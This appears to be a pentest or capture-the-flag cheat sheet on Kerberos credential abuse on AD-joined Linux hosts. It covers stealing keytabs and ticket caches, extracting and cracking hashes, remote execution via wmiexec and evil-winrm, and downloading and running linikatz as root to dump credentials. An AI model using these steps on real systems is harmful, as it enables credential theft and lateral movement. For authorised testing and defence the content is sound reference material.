**Overview:**
- Linux machines joined to AD use Kerberos for authentication. Two ticket storage formats are used: keytab files (static, used by scripts and services) and ccache files (dynamic, tied to active user sessions).
- Keytab files store Kerberos principal/key pairs and allow authentication without a password. They are commonly used in cronjobs and automation scripts, often left world-readable by mistake.
- ccache files store active TGTs for logged-in users and are located in `/tmp` by default. Their path is referenced by the `KRB5CCNAME` environment variable. Only readable by the owning user, but accessible as root.
- The computer account keytab is stored at `/etc/krb5.keytab` (root-only). Compromising it allows impersonation of the machine account.
- ccache files expire. Always check `klist` for validity before using a ticket.
---
## Identifying AD Integration

```bash
realm list
```

Shows domain membership, auth type, permitted users and groups. Requires `realmd`.

```bash
ps -ef | grep -i "winbind\|sssd"
```

Alternative check. Running `sssd` or `winbind` processes confirm AD integration.

---
## Finding Keytab Files

```bash
find / -name *keytab* -ls 2>/dev/null
```

Searches for keytab files by name. Requires read and write permissions to use a keytab file.

```bash
crontab -l
cat <script path>
```

Cronjobs using `kinit` reference keytab files inline. Look for `-k -t <file>` arguments to find non-standard keytab paths.

---
## Finding ccache Files

```bash
env | grep -i krb5
```

Shows the current session's ccache path via `KRB5CCNAME`.

```bash
ls -la /tmp
```

Lists all ccache files in `/tmp`. Files named `krb5cc_<UID>_<random>` belong to active user sessions. Requires root to access other users' files.

---
## Keytab Abuse

```bash
klist -k -t <file>.keytab
```

Reads the principal name from a keytab file. Use the exact principal name (case-sensitive) with `kinit`.

```bash
kinit <user>@<DOMAIN> -k -t <file>.keytab
```

Imports the keytab into the current session as the target user. Verify with `klist`.

```bash
smbclient //<target>/<share> -k -c ls
```

Tests access to a network share using the active Kerberos ticket.

> Save your current ccache before importing a keytab to avoid losing your existing TGT: `cp $KRB5CCNAME /tmp/original.ccache`

---
## Keytab Hash Extraction

```bash
python3 keytabextract.py <file>.keytab
```

Extracts NTLM, AES256, and AES128 hashes from the keytab. NTLM hashes can be cracked with hashcat or used for PtH. AES hashes can be used to forge tickets via Rubeus. Tool: [https://github.com/sosdave/KeyTabExtract](https://github.com/sosdave/KeyTabExtract)

```bash
hashcat -m 1000 <NThash> /usr/share/wordlists/rockyou.txt
```

Cracks the extracted NTLM hash.

---
## ccache Abuse

```bash
cp /tmp/krb5cc_<UID>_<id> /root/
export KRB5CCNAME=/root/krb5cc_<UID>_<id>
klist
```

Copies a target user's ccache and sets it as the active ticket. Verify the ticket is still valid with `klist` before using it.

---
## Remote Tools via Proxychains

> Requires Chisel tunnel and proxychains configured. See `05-lateral-movement/pivoting/`. Add DC and target IPs to `/etc/hosts` for name resolution.

```bash
export KRB5CCNAME=<path to ccache>
proxychains impacket-wmiexec <target> -k -no-pass
```

Executes commands on the target using the active Kerberos ticket. Use hostname, not IP. `-no-pass` suppresses password prompts.

```bash
proxychains evil-winrm -i <target> -r <DOMAIN>
```

Opens a WinRM session using Kerberos. Requires `krb5-user` package and `/etc/krb5.conf` configured with the domain realm and KDC.

`/etc/krb5.conf` minimum config example:

```ini
[libdefaults]
    default_realm = VOLEUR.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = true

[realms]
    VOLEUR.HTB = {
        kdc = DC.voleur.htb
        admin_server = DC.voleur.htb
    }

[domain_realm]
    .voleur.htb = VOLEUR.HTB
    voleur.htb = VOLEUR.HTB
```

---
## Ticket Conversion (ccache - kirbi)

```bash
impacket-ticketConverter <input> <output>.kirbi
impacket-ticketConverter <input>.kirbi <output>.ccache
```

Converts between Linux ccache and Windows kirbi formats. Use when moving tickets across platforms. Import the resulting `.kirbi` on Windows with Rubeus `ptt`. 

---
## Linikatz

```bash
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
chmod +x linikatz.sh
sudo ./linikatz.sh
```

Dumps all Kerberos credentials from a domain-joined Linux machine. Requires root. Extracts keytabs and ccache files from SSSD, Samba, FreeIPA, and other AD integration implementations. Output is saved to a `linikatz.` prefixed folder.